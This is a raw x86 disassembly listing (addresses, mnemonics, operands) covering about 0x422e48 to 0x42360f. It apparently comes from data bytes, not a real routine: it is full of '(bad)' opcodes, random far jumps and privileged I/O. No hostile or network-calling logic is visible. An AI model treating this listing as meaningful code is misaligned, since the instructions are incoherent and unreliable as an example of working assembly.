  422e48:	mov    esp,0x8f43ff2a
  422e4d:	mov    dl,0xa2
  422e4f:	and    DWORD PTR [esi],0xffffffdc
  422e52:	sahf   
  422e53:	into   
  422e54:	je     0x422ecc
  422e56:	retf   0xf3b5
  422e59:	jl     0x422ded
  422e5b:	jg     0x422eac
  422e5d:	pop    es
  422e5e:	add    dl,BYTE PTR [esi+0x67]
  422e61:	mov    eax,ds:0xff3bfba8
  422e66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e67:	lea    edi,[edx-0x78]
  422e6a:	fucom  st(2)
  422e6c:	fwait
  422e6d:	or     ah,BYTE PTR [edx+0x76c51962]
  422e73:	and    eax,0xcb2af21f
  422e78:	nop
  422e79:	mov    ecx,DWORD PTR [ebx]
  422e7b:	pop    ds
  422e7c:	adc    al,BYTE PTR [eax-0x60d4bbaf]
  422e82:	jmp    0x1322:0x3619625b
  422e89:	hlt    
  422e8a:	inc    edx
  422e8b:	out    dx,al
  422e8c:	and    eax,0x49060f6a
  422e91:	add    eax,0xb5660346
  422e96:	scas   al,BYTE PTR es:[edi]
  422e97:	and    esp,DWORD PTR [esi-0x3e]
  422e9a:	cwde   
  422e9b:	pop    es
  422e9c:	test   BYTE PTR [eax+0x76],ch
  422e9f:	pop    esp
  422ea0:	shl    DWORD PTR [ecx],cl
  422ea2:	xor    ah,BYTE PTR [esi+0x1ffcf5f5]
  422ea8:	add    BYTE PTR [edx+0x285e2468],0x6b
  422eaf:	jmp    0x422ed2
  422eb1:	sbb    eax,0xa8309c20
  422eb6:	xor    bl,BYTE PTR [eax]
  422eb8:	fs dec esi
  422eba:	mov    bh,0x28
  422ebc:	repz enter 0x1ce0,0xd8
  422ec1:	inc    edx
  422ec2:	sub    eax,0x78134471
  422ec7:	xchg   edi,eax
  422ec8:	push   ebp
  422ec9:	xor    BYTE PTR [edx+0x6d],ch
  422ecc:	mov    edi,0x695d9085
  422ed1:	(bad)  
  422ed2:	mov    al,ds:0x7a1e1fe6
  422ed7:	xor    ah,BYTE PTR [edi-0x51599ec9]
  422edd:	cdq    
  422ede:	pop    es
  422edf:	fld    QWORD PTR [ebx+0x7e]
  422ee2:	xchg   esi,eax
  422ee3:	popa   
  422ee4:	(bad)  
  422ee5:	icebp  
  422ee6:	mov    edx,0x5a3a3e64
  422eeb:	shr    DWORD PTR [esi],cl
  422eed:	cld    
  422eee:	lds    ebx,FWORD PTR [edi-0x36]
  422ef1:	adc    DWORD PTR [ebx],ebx
  422ef3:	xchg   esi,eax
  422ef4:	fsubr  QWORD PTR [esi+0x7042c783]
  422efa:	bnd ja 0x422f60
  422efd:	bound  esp,QWORD PTR [ebx-0x16]
  422f00:	mov    ah,0x17
  422f02:	mov    eax,0xffc9340e
  422f07:	and    ah,ah
  422f09:	xor    esp,edi
  422f0b:	and    BYTE PTR [eax+0x46],cl
  422f0e:	xor    eax,0x94386116
  422f13:	imul   esi,DWORD PTR [ebx+ebp*2-0x69],0xb1aba33d
  422f1b:	and    bh,bh
  422f1d:	jb     0x422f03
  422f1f:	jno    0x422f1d
  422f21:	loopne 0x422f22
  422f23:	push   ebx
  422f24:	mov    bl,0x23
  422f26:	inc    ebp
  422f27:	ret    
  422f28:	iret   
  422f29:	mov    ebp,0x295fa7f5
  422f2e:	sub    al,0x5d
  422f30:	lods   eax,DWORD PTR ds:[esi]
  422f31:	push   cs
  422f32:	jmp    0x9f95:0x984a39e8
  422f39:	shl    DWORD PTR [ecx],1
  422f3b:	enter  0x1893,0xf5
  422f3f:	xor    eax,0x6e4097d1
  422f44:	adc    al,0x6d
  422f46:	or     bl,BYTE PTR [ecx]
  422f48:	sbb    bh,0x4f
  422f4b:	xor    DWORD PTR [esi],esp
  422f4d:	ret    0xf1f
  422f50:	add    DWORD PTR [eax],ebp
  422f52:	jle    0x422f17
  422f54:	mov    eax,0x5e1cc14e
  422f59:	out    dx,eax
  422f5a:	or     ebp,edx
  422f5c:	fcomp  QWORD PTR [ecx-0x54d8115]
  422f62:	ins    DWORD PTR es:[edi],dx
  422f63:	sbb    DWORD PTR [ecx+ebp*2-0x29],edx
  422f67:	ja     0x422ef5
  422f69:	outs   dx,BYTE PTR ds:[esi]
  422f6a:	dec    ebp
  422f6b:	(bad)  
  422f6c:	sbb    DWORD PTR [eax-0x68],esp
  422f6f:	icebp  
  422f70:	ret    
  422f71:	mov    dl,0xcc
  422f73:	stos   DWORD PTR es:[edi],eax
  422f74:	dec    eax
  422f75:	push   ecx
  422f76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f77:	daa    
  422f78:	add    BYTE PTR [edx],al
  422f7a:	cmp    ah,BYTE PTR ds:0x913fe5bb
  422f80:	fld    TBYTE PTR [edx+0x3]
  422f83:	sbb    BYTE PTR [edx-0x334a4a76],dl
  422f89:	adc    al,0x6a
  422f8b:	fild   DWORD PTR [esi]
  422f8d:	aad    0xf5
  422f8f:	add    eax,edi
  422f91:	adc    al,0x1b
  422f93:	(bad)  
  422f94:	fmul   QWORD PTR [esi-0x5e5c6a09]
  422f9a:	pandn  mm2,QWORD PTR [edx-0x5]
  422f9e:	aad    0xe8
  422fa0:	fsub   DWORD PTR [edx+0x4030b064]
  422fa6:	pop    ss
  422fa7:	xor    eax,0xe50b89ca
  422fac:	lock or al,0xe0
  422faf:	push   esp
  422fb0:	xchg   edi,eax
  422fb1:	call   0x4525:0xab81c83e
  422fb8:	aas    
  422fb9:	in     al,dx
  422fba:	add    BYTE PTR [eax+0x6b],dl
  422fbd:	jns    0x422f57
  422fbf:	dec    ecx
  422fc0:	test   BYTE PTR [edi-0x53],0x13
  422fc4:	(bad)  
  422fc5:	jb     0x422f95
  422fc7:	and    esi,DWORD PTR [eax+0x58cf5af2]
  422fcd:	mov    dl,0x92
  422fcf:	sub    al,0xe0
  422fd1:	and    bh,BYTE PTR [ecx-0x12]
  422fd4:	dec    ebx
  422fd5:	inc    ecx
  422fd6:	mov    eax,ds:0xe0bb52ae
  422fdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422fdc:	gs mov cl,0xfd
	...
  422fe7:	add    BYTE PTR [eax],al
  422fe9:	add    BYTE PTR [eax+0x4e],dl
  422fec:	dec    edi
  422fed:	push   esi
  422fee:	pop    edi
  422fef:	push   edi
  422ff0:	pop    ecx
  422ff1:	dec    esi
  422ff2:	idiv   BYTE PTR [ebx+0x53]
  422ff5:	jns    0x422f8a
  422ff7:	inc    ebx
  422ff8:	push   eax
  422ff9:	pop    es
  422ffa:	xor    bh,BYTE PTR [esi+0x67d0001]
  423000:	add    BYTE PTR [eax],al
  423002:	mov    dh,0xb8
  423004:	lock cwde 
  423006:	mov    ds:0xa154507e,al
  42300b:	cwde   
  42300c:	mov    cl,0x6d
  42300e:	das    
  42300f:	sbb    dh,cl
  423011:	pop    esp
  423012:	fnsave [edx]
  423014:	daa    
  423015:	adc    eax,0x3a3b2c1b
  42301a:	xchg   esi,eax
  42301b:	nop    esp
  42301e:	cdq    
  42301f:	mov    al,ds:0x3533e3
  423024:	cli    
  423025:	inc    ebx
  423026:	mov    DWORD PTR [ecx-0x772f554b],edi
  42302c:	ror    DWORD PTR [edx-0x62],1
  42302f:	sub    BYTE PTR ds:0xfe649a9d,ah
  423035:	lds    edi,FWORD PTR [eax]
  423037:	das    
  423038:	xor    esi,DWORD PTR [edx+0xa0276bb]
  42303e:	push   0xdb387f46
  423043:	daa    
  423044:	jne    0x423000
  423046:	sbb    BYTE PTR [edi-0x7b],bl
  423049:	xchg   ebx,eax
  42304a:	jae    0x4230b5
  42304c:	inc    esi
  42304d:	in     al,0x19
  42304f:	lahf   
  423050:	inc    esp
  423051:	imul   edx,ebp,0x84db2c
  423057:	mov    DWORD PTR [eax],ebp
  423059:	scas   eax,DWORD PTR es:[edi]
  42305a:	mov    ebx,0x3685cac7
  42305f:	xchg   DWORD PTR [esi-0x29],eax
  423062:	mov    ds:0x57fefbba,al
  423067:	repnz sub eax,0x51f8329d
  42306d:	nop
  42306e:	cmp    ecx,esi
  423070:	push   cs
  423071:	add    al,0x37
  423073:	fcomp  QWORD PTR [ebx+0x12]
  423076:	sahf   
  423077:	jmp    0x42303e
  423079:	cld    
  42307a:	mov    DWORD PTR [ebx],ebp
  42307c:	push   es
  42307d:	xchg   esp,eax
  42307e:	enter  0x168b,0x5f
  423082:	(bad)  
  423083:	in     eax,0x44
  423085:	sbb    al,0x14
  423087:	adc    DWORD PTR [eax],esi
  423089:	lahf   
  42308a:	and    DWORD PTR [eax-0x64af67d5],eax
  423090:	dec    ax
  423092:	int3   
  423093:	mov    al,dh
  423095:	mov    ecx,0x1fc0e96e
  42309a:	repnz dec DWORD PTR [ecx]
  42309d:	mov    BYTE PTR [edi+0x4ec64cf0],al
  4230a3:	out    0xb1,eax
  4230a5:	mov    ah,0x21
  4230a7:	(bad)  es:[edi-0x61b81b69]
  4230ae:	sti    
  4230af:	mov    bl,0xbb
  4230b1:	jnp    0x4230e4
  4230b3:	rcr    edi,cl
  4230b5:	xchg   ecx,eax
  4230b6:	shr    DWORD PTR [ebx],0x14
  4230b9:	scas   eax,DWORD PTR es:[edi]
  4230ba:	jmp    0xe172aa48
  4230bf:	enter  0x5a02,0xfc
  4230c3:	mov    ah,0xf4
  4230c5:	sub    bl,BYTE PTR [ecx+0x28]
  4230c8:	xor    eax,0xffbff46a
  4230cd:	add    al,0x5c
  4230cf:	in     eax,dx
  4230d0:	out    dx,al
  4230d1:	inc    esi
  4230d2:	dec    ecx
  4230d3:	jo     0x4230d1
  4230d5:	dec    ebp
  4230d6:	mov    al,0xf8
  4230d8:	xchg   DWORD PTR [edx+0x44],esp
  4230db:	in     al,0x91
  4230dd:	pcmpgtb mm6,QWORD PTR [ebx-0x37206af2]
  4230e4:	cmp    al,cl
  4230e6:	int3   
  4230e7:	mov    dl,BYTE PTR [eax-0x73]
  4230ea:	stos   BYTE PTR es:[edi],al
  4230eb:	scas   al,BYTE PTR es:[edi]
  4230ec:	cmp    ch,BYTE PTR [eax-0x32]
  4230ef:	aas    
  4230f0:	ret    
  4230f1:	ins    BYTE PTR es:[edi],dx
  4230f2:	sbb    dh,BYTE PTR [ecx-0x7a]
  4230f5:	cmp    eax,0x4cc81bc9
  4230fa:	dec    ebp
  4230fb:	push   ebx
  4230fc:	xor    ah,bl
  4230fe:	push   ss
  4230ff:	inc    esi
  423100:	sub    eax,0x246ef592
  423105:	test   BYTE PTR [ebp+0x31],0x5c
  423109:	ins    DWORD PTR es:[edi],dx
  42310a:	jns    0x423144
  42310c:	add    bh,BYTE PTR [esi+0x3c]
  42310f:	ror    edi,1
  423111:	mov    cl,0x11
  423113:	adc    al,0x24
  423115:	ss retf 0x2de3
  423119:	out    dx,eax
  42311a:	inc    esi
  42311b:	repz jecxz 0x4230f8
  42311e:	retf   
  42311f:	cmc    
  423120:	xchg   bh,bl
  423122:	aam    0x64
  423124:	xor    al,0x95
  423126:	dec    edi
  423127:	scas   eax,DWORD PTR es:[edi]
  423128:	mov    al,0xdf
  42312a:	dec    ebp
  42312b:	jno    0x4230e5
  42312d:	xchg   BYTE PTR [edi-0x6f5bc434],ch
  423133:	dec    eax
  423134:	or     eax,DWORD PTR [edi-0x9]
  423137:	mov    esp,0xe92ffba4
  42313c:	xor    ebp,DWORD PTR [edi]
  42313e:	nop    DWORD PTR [ecx+edx*4]
  423142:	mov    dh,0x1b
  423144:	mov    ch,0x34
  423146:	imul   ebx,DWORD PTR [edi+0x66],0xb1c7fb9c
  42314d:	mov    ecx,0x5673e1ff
  423152:	sahf   
  423153:	cmc    
  423154:	call   0x8789:0x771dc707
  42315b:	mov    ss,esp
  42315d:	or     DWORD PTR [ebx+0x41],0xffffffca
  423161:	ins    DWORD PTR es:[edi],dx
  423162:	mov    ah,0x84
  423164:	shl    DWORD PTR [eax+0x5870e203],1
  42316a:	xor    al,BYTE PTR [esi+0x75]
  42316d:	inc    esi
  42316e:	call   0x4443db00
  423173:	outs   dx,BYTE PTR ds:[esi]
  423174:	mov    al,0x8d
  423176:	mov    al,0x4f
  423178:	push   ds
  423179:	inc    edi
  42317b:	mov    ebp,0xb726eaed
  423180:	xor    DWORD PTR [esi-0x18c424f1],ebp
  423186:	shl    BYTE PTR [esi-0x68],0x50
  42318a:	stos   DWORD PTR es:[edi],eax
  42318b:	cmp    al,ah
  42318d:	sbb    dh,ch
  42318f:	pop    ebx
  423190:	or     ch,BYTE PTR [ebx+0x441a28c5]
  423196:	sbb    edx,ecx
  423198:	mov    edi,0x46b46550
  42319d:	xor    eax,0xf6bdce3
  4231a2:	mov    bh,0xb5
  4231a4:	aas    
  4231a5:	mov    eax,ds:0x78269d84
  4231aa:	jne    0x4231c7
  4231ac:	daa    
  4231ad:	pop    es
  4231ae:	out    0x2c,eax
  4231b0:	mov    DWORD PTR [esi-0x7b],0xdca1b167
  4231b7:	ds push ebx
  4231b9:	sub    eax,0x34979e7c
  4231be:	(bad)
  4231c2:	fisub  WORD PTR [ecx-0x2a3cee12]
  4231c8:	inc    ebx
  4231c9:	adc    al,0x3e
  4231cb:	pop    es
  4231cc:	sub    ch,al
  4231ce:	mov    eax,ds:0xf84dbef6
  4231d3:	dec    ebp
  4231d4:	test   BYTE PTR [edx],bl
  4231d6:	sbb    DWORD PTR [ebp-0x24],edi
  4231d9:	add    edx,DWORD PTR [edi+0x7ecac2f2]
  4231df:	aad    0xec
  4231e1:	inc    ebx
  4231e2:	daa    
  4231e3:	jmp    0x131f1833
  4231e8:	test   ebx,0x833cfd83
  4231ee:	xchg   edx,eax
  4231ef:	pop    esp
  4231f0:	cmp    BYTE PTR [ecx+0x61d4019d],bl
  4231f6:	sub    al,0x27
  4231f8:	sbb    eax,0xf71805e0
  4231fd:	cmp    eax,0x9062a0a0
  423202:	dec    edx
  423203:	xor    ch,BYTE PTR [ecx-0x2e876b9]
  423209:	mov    dh,0x7e
  42320b:	or     ebx,DWORD PTR [ebx+0x4a]
  42320e:	jmp    0xdb9614b0
  423213:	repz out 0xfc,al
  423216:	test   BYTE PTR [ebx-0x39],dl
  423219:	ficom  DWORD PTR [edx+0x7b7801ba]
  42321f:	and    eax,0xf6f13f71
  423224:	stc    
  423225:	or     BYTE PTR [edx-0x2b6da0a7],cl
  42322b:	pop    ebx
  42322c:	imul   eax,ecx,0x56fff5d
  423232:	jmp    0xd1b54f92
  423237:	or     bh,cl
  423239:	and    DWORD PTR [ebx+0x42ba45ed],ebx
  42323f:	pusha  
  423240:	bound  esp,QWORD PTR [edi]
  423242:	sbb    BYTE PTR [ecx],0x19
  423245:	adc    bl,BYTE PTR [edx+0x44c8f6e5]
  42324b:	dec    ebx
  42324c:	jbe    0x4232a6
  42324e:	mov    ah,0x7b
  423250:	push   0xffffffbc
  423252:	sub    BYTE PTR [eax+eiz*8+0x12d073a4],ah
  423259:	out    dx,al
  42325a:	sub    bh,BYTE PTR [edi]
  42325c:	push   esi
  42325d:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  42325f:	es out 0xc6,eax
  423262:	jge    0x423294
  423264:	call   0x1797:0x67ff61b1
  42326b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42326c:	shr    BYTE PTR [esi-0x60ac3f08],0xff
  423273:	push   es
  423274:	(bad)  
  423275:	lea    esp,[ebx+ebx*4]
  423278:	out    0x16,al
  42327a:	cmp    al,0x8a
  42327c:	dec    eax
  42327d:	scas   al,BYTE PTR es:[edi]
  42327e:	jns    0x42324c
  423280:	stc    
  423281:	mov    fs,eax
  423283:	pop    es
  423284:	lods   al,BYTE PTR ds:[esi]
  423285:	sbb    DWORD PTR [edx-0x3e0e8a6c],esi
  42328b:	outs   dx,BYTE PTR ds:[esi]
  42328c:	and    bl,BYTE PTR [edx+0x5a871ae7]
  423292:	sti    
  423293:	pop    ecx
  423294:	dec    edx
  423295:	sbb    al,0x68
  423297:	sbb    BYTE PTR [eax+0x62],bh
  42329a:	push   edi
  42329b:	int3   
  42329c:	mov    ebp,eax
  42329e:	sbb    DWORD PTR [ebx+0x76],esi
  4232a1:	add    DWORD PTR [esp+esi*1],ebx
  4232a4:	fmul   st,st(5)
  4232a6:	sbb    esp,DWORD PTR [edx]
  4232a8:	sub    DWORD PTR [edx],edi
  4232aa:	cs adc esi,edx
  4232ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4232ae:	or     esi,ebp
  4232b0:	push   esi
  4232b1:	jecxz  0x423284
  4232b3:	sbb    ecx,DWORD PTR [edi+0x79]
  4232b6:	cmp    eax,0x85c5a0
  4232bb:	ret    
  4232bc:	test   DWORD PTR [edx],ecx
  4232be:	in     al,0xc1
  4232c0:	adc    BYTE PTR [edi+0x26258f65],0xfa
  4232c7:	cld    
  4232c8:	imul   ebp,DWORD PTR [eax],0x37e533f3
  4232ce:	mov    bh,0xd0
  4232d0:	and    edx,esi
  4232d2:	jmp    0xaf009837
  4232d7:	push   edx
  4232d8:	add    BYTE PTR [esi+0x18b2f863],bh
  4232de:	cli    
  4232df:	repz dec ecx
  4232e1:	dec    ebx
  4232e2:	rol    edi,0x8f
  4232e5:	fisubr DWORD PTR [edi+0x17eb9b8d]
  4232eb:	leave  
  4232ec:	inc    edi
  4232ed:	pop    ecx
  4232ee:	xchg   edi,eax
  4232ef:	mov    al,ds:0xcc884359
  4232f4:	push   edx
  4232f5:	push   es
  4232f6:	xor    al,0x87
  4232f8:	out    dx,eax
  4232f9:	enter  0x3dfd,0xad
  4232fd:	pop    eax
  4232fe:	lahf   
  4232ff:	pop    ebx
  423300:	cwde   
  423301:	mov    bl,0xce
  423303:	inc    esi
  423304:	mov    dl,0x9d
  423306:	sub    ebp,DWORD PTR ds:0x39dee3e8
  42330c:	or     eax,0x8c2fb2e8
  423311:	fidivr DWORD PTR [eax]
  423313:	fnstsw WORD PTR [eax]
  423315:	inc    ecx
  423316:	pushf  
  423317:	mov    edx,gs
  423319:	jns    0x423303
  42331b:	mov    dl,0x98
  42331d:	sbb    esp,DWORD PTR [edx+ebp*4-0x58]
  423321:	mov    dh,0x4c
  423323:	cli    
  423324:	jae    0x423320
  423326:	fidivr WORD PTR [esi-0x32321dcc]
  42332c:	int3   
  42332d:	lahf   
  42332e:	sbb    DWORD PTR [ecx],0xc01cd6ab
  423334:	pop    eax
  423335:	(bad)  
  423336:	(bad)  
  423338:	cmp    eax,0xc5afdab6
  42333d:	clc    
  42333e:	dec    esi
  42333f:	out    dx,al
  423340:	cli    
  423341:	push   ds
  423342:	pushf  
  423343:	ins    BYTE PTR es:[edi],dx
  423344:	fcomip st,st(3)
  423346:	loope  0x423389
  423348:	jmp    0xbf01:0x4a7b4a7a
  42334f:	sar    BYTE PTR [ebx],cl
  423351:	mov    edi,DWORD PTR [ebx]
  423353:	pop    ebp
  423354:	test   DWORD PTR [esi],0x8c7ecc24
  42335a:	pop    edx
  42335b:	xchg   ebx,eax
  42335c:	pop    es
  42335d:	add    al,0xf8
  42335f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423360:	push   es
  423361:	ja     0x423345
  423363:	pop    es
  423364:	push   ds
  423365:	repnz (bad) 
  423367:	imul   edx,esi,0x7f
  42336a:	aad    0x6a
  42336c:	adc    eax,0xc340d723
  423371:	cdq    
  423372:	call   0x4db71668
  423377:	data16 mov dl,0x21
  42337a:	sub    al,0xe3
  42337c:	mov    edi,esp
  42337e:	sbb    esp,DWORD PTR [ebx-0x3d006117]
  423384:	add    al,bh
  423386:	pop    esi
  423387:	out    0xb2,al
  423389:	inc    ebp
  42338a:	lods   al,BYTE PTR ds:[esi]
  42338b:	pop    esp
  42338c:	fisttp DWORD PTR [edi-0x1345a8cc]
  423392:	mov    edi,0xce3e96ce
  423397:	jl     0x42334b
  423399:	adc    DWORD PTR [esi],edx
  42339b:	mov    dh,0xd1
  42339d:	call   DWORD PTR [edx]
  42339f:	xor    eax,0xeda3f126
  4233a4:	(bad)  
  4233a5:	(bad)  
  4233a6:	sub    al,0xc7
  4233a8:	mov    ch,0xd5
  4233aa:	(bad)  
  4233ac:	js     0x423350
  4233ae:	mov    ah,0x67
  4233b0:	inc    edx
  4233b1:	lock inc ecx
  4233b3:	pop    edi
  4233b4:	stc    
  4233b5:	inc    edx
  4233b6:	pushf  
  4233b7:	jge    0x4233da
  4233b9:	clc    
  4233ba:	push   esi
  4233bb:	xor    al,0xf0
  4233bd:	ins    DWORD PTR es:[edi],dx
  4233be:	fucomip st,st(0)
  4233c0:	scas   al,BYTE PTR es:[edi]
  4233c1:	xchg   esp,eax
  4233c2:	push   ecx
  4233c3:	and    edx,DWORD PTR [ecx+0x3949ef41]
  4233c9:	arpl   WORD PTR [esi],di
  4233cb:	dec    esi
  4233cc:	sar    BYTE PTR [ebp+0x60],cl
  4233cf:	(bad)
  4233d2:	sbb    DWORD PTR [edx],edx
  4233d4:	inc    ebx
  4233d5:	mov    cs,WORD PTR [edi-0xdd4ea11]
  4233db:	cs popa 
  4233dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4233de:	push   esi
  4233df:	cmp    dl,BYTE PTR [edx]
  4233e1:	xchg   esi,eax
  4233e2:	cmp    ah,bh
  4233e4:	scas   eax,DWORD PTR es:[edi]
  4233e5:	cld    
  4233e6:	(bad)  
  4233e7:	repnz mov dl,0x1f
  4233ea:	push   esi
  4233eb:	push   edi
  4233ec:	mov    esi,0xe09ecfd6
  4233f1:	sub    DWORD PTR [edx-0x79],ecx
  4233f4:	ror    DWORD PTR [edx-0x5a325b83],cl
  4233fa:	jae    0x423399
  4233fc:	mov    esp,0x7ffd432c
  423401:	das    
  423402:	dec    ebp
  423403:	(bad)  
  423404:	mov    dl,0x16
  423406:	mov    ebp,edi
  423408:	sub    BYTE PTR [esi-0x8db3ebb],bl
  42340e:	aam    0xf6
  423410:	inc    edi
  423411:	xchg   esp,eax
  423412:	adc    BYTE PTR [ebp-0x451f3a8c],cl
  423418:	sbb    al,0x29
  42341a:	pop    esi
  42341b:	ror    DWORD PTR [eax-0x23e976b6],cl
  423421:	fstp   TBYTE PTR [ecx-0x45dc5003]
  423427:	xlat   BYTE PTR ds:[ebx]
  423428:	cmp    BYTE PTR [ebp-0x33],dh
  42342b:	sbb    DWORD PTR [ecx-0x1a],ebp
  42342e:	pop    ebp
  42342f:	xor    ebp,DWORD PTR [ecx-0x67a60cc9]
  423435:	les    edx,FWORD PTR [esi]
  423437:	inc    ecx
  423438:	(bad)
  42343b:	sub    DWORD PTR ds:0x45450429,ebp
  423441:	and    al,0xc1
  423443:	ret    
  423444:	imul   BYTE PTR [ebp-0x1cd99706]
  42344a:	xor    dl,BYTE PTR [ebp-0x5c]
  42344d:	outs   dx,DWORD PTR ds:[esi]
  42344e:	inc    esi
  42344f:	push   0x976956bc
  423454:	mov    al,ds:0x36468fe4
  423459:	xchg   DWORD PTR [esi+0x1],edx
  42345c:	jl     0x42346e
  42345e:	mov    DWORD PTR [edi+edx*4-0x3d],edi
  423462:	cs mov bl,0x63
  423465:	retf   0x21ba
  423468:	add    esi,DWORD PTR [esi]
  42346a:	mov    DWORD PTR [ebx],0x5739d26d
  423470:	mov    al,ds:0x6a1b8048
  423475:	pop    ebx
  423476:	cli    
  423477:	leave  
  423478:	pop    esp
  423479:	inc    ebx
  42347a:	and    BYTE PTR [esi-0x4d4071cf],al
  423480:	inc    ebp
  423481:	xchg   ecx,eax
  423482:	jo     0x4234cf
  423484:	in     eax,dx
  423485:	sub    ebp,DWORD PTR [edx-0x6b234f94]
  42348b:	dec    DWORD PTR [ebx+ecx*4]
  42348e:	push   ecx
  42348f:	test   edx,esp
  423491:	pop    ds
  423492:	call   0x152e:0x1a917de5
  423499:	mov    ebx,0x6834c107
  42349e:	outs   dx,DWORD PTR ds:[esi]
  42349f:	or     DWORD PTR [ebx+0x54513933],edx
  4234a5:	cld    
  4234a6:	sbb    esp,DWORD PTR [ebx]
  4234a8:	sbb    edx,DWORD PTR [ebp+0x290916ce]
  4234ae:	and    cl,BYTE PTR [esi+0x7]
  4234b1:	jns    0x4234f2
  4234b3:	inc    edi
  4234b4:	jecxz  0x423490
  4234b6:	in     al,dx
  4234b7:	icebp  
  4234b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4234b9:	sbb    al,0xa3
  4234bb:	out    dx,eax
  4234bc:	shl    edi,cl
  4234be:	pop    es
  4234bf:	imul   esi,edi,0xffffffe1
  4234c2:	test   DWORD PTR [eax],ebx
  4234c4:	ss mov ch,0x5a
  4234c7:	(bad)  
  4234c8:	fisttp DWORD PTR ds:0x971d445e
  4234ce:	pop    ds
  4234cf:	aaa    
  4234d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4234d1:	cli    
  4234d2:	daa    
  4234d3:	xlat   BYTE PTR ds:[ebx]
  4234d4:	xlat   BYTE PTR ds:[ebx]
  4234d5:	in     eax,dx
  4234d6:	call   0x987f:0x35d435ce
  4234dd:	stos   DWORD PTR es:[edi],eax
  4234de:	fcmovb st,st(3)
  4234e0:	mov    edi,0x6210e0e6
  4234e5:	push   ecx
  4234e6:	jne    0x4234ae
  4234e8:	sub    BYTE PTR ds:0xdda5f1f6,dl
  4234ee:	mov    ch,0x44
  4234f0:	push   cs
  4234f1:	pop    ss
  4234f2:	je     0x42347c
  4234f4:	fwait
  4234f5:	and    BYTE PTR fs:[ecx-0x80],ch
  4234f9:	mov    esi,DWORD PTR [eax+ebx*4-0x1]
  4234fd:	or     BYTE PTR [ebx-0xdf42d00],dh
  423503:	(bad)  
  423504:	xchg   edi,eax
  423505:	and    BYTE PTR [ebx+0x6ebd0dc],dl
  42350b:	mov    ecx,0xa7c1103c
  423510:	push   edx
  423511:	test   cl,dl
  423513:	inc    edi
  423514:	not    DWORD PTR [ecx-0x5e]
  423517:	or     al,BYTE PTR [ecx+esi*4-0x2]
  42351b:	outs   dx,DWORD PTR ds:[esi]
  42351c:	push   0xbeb8416d
  423521:	test   DWORD PTR [esi],0xe8d58bb8
  423527:	pop    ss
  423528:	adc    BYTE PTR [ecx+0x5f],0xc4
  42352c:	aad    0xe0
  42352e:	fidiv  WORD PTR [ebx-0x6e931d1]
  423534:	loope  0x42359b
  423536:	sbb    edi,DWORD PTR [edx+edi*8+0x6efbf006]
  42353d:	pop    ebx
  42353e:	ja     0x4234e4
  423540:	mov    eax,ecx
  423542:	adc    BYTE PTR [ebx+esi*4-0x37],dl
  423546:	or     DWORD PTR [esi],eax
  423548:	test   al,0xb7
  42354a:	push   edx
  42354b:	into   
  42354c:	inc    ebp
  42354d:	pop    ebx
  42354e:	xor    ch,al
  423550:	xlat   BYTE PTR ds:[ebx]
  423551:	jl     0x4235c7
  423553:	push   0xce03b616
  423558:	mov    DWORD PTR [edi-0x2a],ebp
  42355b:	add    edx,DWORD PTR [eax-0x38621c80]
  423561:	cwde   
  423562:	sbb    ebx,edi
  423564:	data16 fmul DWORD PTR [esi]
  423567:	std    
  423568:	pop    ss
  423569:	sub    ebx,DWORD PTR [esi+0x75]
  42356c:	lahf   
  42356d:	adc    eax,0x5cb6a951
  423572:	(bad)  
  423573:	test   al,0xaa
  423575:	fbstp  TBYTE PTR [ecx]
  423577:	xchg   ebx,eax
  423578:	jae    0x4235cf
  42357a:	dec    esi
  42357b:	std    
  42357c:	sub    DWORD PTR [esi-0x5616d4dc],esi
  423582:	imul   esp,DWORD PTR [edi-0x4],0x5eb79fd1
  423589:	aam    0xfe
  42358b:	ins    BYTE PTR es:[edi],dx
  42358c:	(bad)  
  42358d:	xlat   BYTE PTR ds:[ebx]
  42358e:	cld    
  42358f:	cmp    eax,DWORD PTR [ecx]
  423591:	(bad)  [ecx+0x3a]
  423594:	scas   eax,DWORD PTR es:[edi]
  423595:	std    
  423596:	jg     0x4235cc
  423598:	cmp    edi,esp
  42359a:	sub    eax,esi
  42359c:	sub    BYTE PTR [esi-0x30],al
  42359f:	sbb    al,0xda
  4235a1:	pop    edx
  4235a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4235a3:	mov    ebp,0x33810317
  4235a8:	push   esp
  4235a9:	ror    BYTE PTR [edi*4+0x629524c8],1
  4235b0:	xchg   esi,eax
  4235b1:	push   esp
  4235b2:	cmc    
  4235b3:	call   0xb1686758
  4235b8:	pop    ss
  4235b9:	gs dec esi
  4235bb:	int    0x51
  4235bd:	fdiv   QWORD PTR [eax]
  4235bf:	lahf   
  4235c0:	mov    ebp,0xb5805b64
  4235c5:	add    DWORD PTR [ebp+0x4d],ebx
  4235c8:	(bad)  
  4235c9:	cli    
  4235ca:	repnz and bh,BYTE PTR [ebx+esi*4]
  4235ce:	mov    eax,ds:0xaa9f2698
  4235d3:	pop    eax
  4235d4:	xchg   esi,eax
  4235d5:	stos   BYTE PTR es:[edi],al
  4235d6:	outs   dx,BYTE PTR ds:[esi]
  4235d7:	push   eax
  4235d8:	ror    DWORD PTR [edx-0x45],cl
  4235db:	xchg   BYTE PTR [ebx-0xb],bl
  4235de:	pop    edx
  4235df:	sti    
  4235e0:	(bad)  
  4235e1:	arpl   WORD PTR [edx-0x55],sp
  4235e4:	push   edx
  4235e5:	inc    ebx
  4235e6:	lds    ebp,FWORD PTR [ecx+0x78dec3d8]
  4235ec:	jae    0x42361e
  4235ee:	out    0x3f,eax
  4235f0:	jno    0x423610
  4235f2:	shr    DWORD PTR ds:0x9efe7058,0x3a
  4235f9:	and    bl,BYTE PTR [edi+0x3d]
  4235fc:	mov    ds:0xd9c1b797,al
  423601:	inc    edx
  423602:	mov    edi,DWORD PTR [edi+edi*8]
  423605:	shr    DWORD PTR [esi+0x2d],1
  423608:	jmp    0xf443:0xf0253d29
  42360f:	sub    dh,BYTE PTR [ecx-0x275ffd71]
